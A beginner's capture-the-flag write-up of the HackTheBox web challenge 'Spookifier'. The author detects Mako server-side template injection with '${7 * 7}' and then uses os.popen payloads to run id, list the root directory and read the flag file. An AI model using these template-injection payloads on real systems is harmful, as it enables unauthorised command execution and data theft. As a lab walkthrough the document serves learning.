---
title: "HTB Spookifier"
draft: false
tags: ["HTB", "CTF"]
type: "page"
cascade:
  # keep the learning folders out of any list
  _target:
    path: learning/**
  build:
    list: false
---


# HTB Challenge: Spookifier (Beginner Write-up)

In this post, I’ll go over the **HackTheBox challenge Spookifier**.  
It’s a web challenge, and I’ll explain step by step how I solved it as a first-year uni student.  

## Step 1: Explore the Web App

After starting the challenge, I opened the website.  
It’s called **Spookifier** and it asks you to enter your “Halloween name.”  

![1st](1st.png)  

When I typed my name, it showed the result in four different fonts.  

![2nd](2nd.png)  

At first, I thought it might be an **XSS challenge**, but there wasn’t any admin bar or cookie stealing option. I also noticed there was a file I could download, so I grabbed it to check inside.  


## Step 2: Inspect the Source Code

The file turned out to be a **Flask application**. I opened it with `cat main.py`:  

```bash
cat main.py
```

The interesting part was that it used **Mako Templates**. That immediately made me think of **Server-Side Template Injection (SSTI)**.  

![3rd](3rd.png)  


## Step 3: Test for SSTI

First, I tried a common SSTI payload:  

```bash
{{7*7}}
```

Nothing happened. Then I remembered that for Mako, the syntax is different, so I used:  

```bash
${7 * 7}
```

And yes! It returned **49**.  

![4th](4th.png)  


## Step 4: Run Commands

I looked up some Mako payloads on PayloadsAllTheThings and tried this:  

```bash
${self.module.cache.util.os.system("id")}
```

But it only returned `0`. That’s because `system` runs the command but doesn’t return the output.  

![5th](5th.png)  

To actually see the output, I switched to `popen().read()`:  

```bash
${self.module.cache.util.os.popen("id").read()}
```

This time, it worked and printed my user info.  

![6th](6th.png)  

## Step 5: Find and Read the Flag

Next, I checked the root directory:  

```bash
${self.module.cache.util.os.popen("ls /").read()}
```

I saw **flag.txt** inside.  

![7th](7th.png)  

Finally, I read the flag with:  

```bash
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```

And boom 🎉 I got the flag!  

![8th](8th.png)  


## Conclusion  

This was a really fun SSTI challenge. Here’s what I learned:  

- Always check source code if it’s provided.  
- Mako uses `${ }` instead of `{{ }}` for templates.  
- `os.system` executes but doesn’t show output — `os.popen().read()` does.  
- Use `ls` to locate files and `cat` to read them.  

✅ **Flag Captured!**  
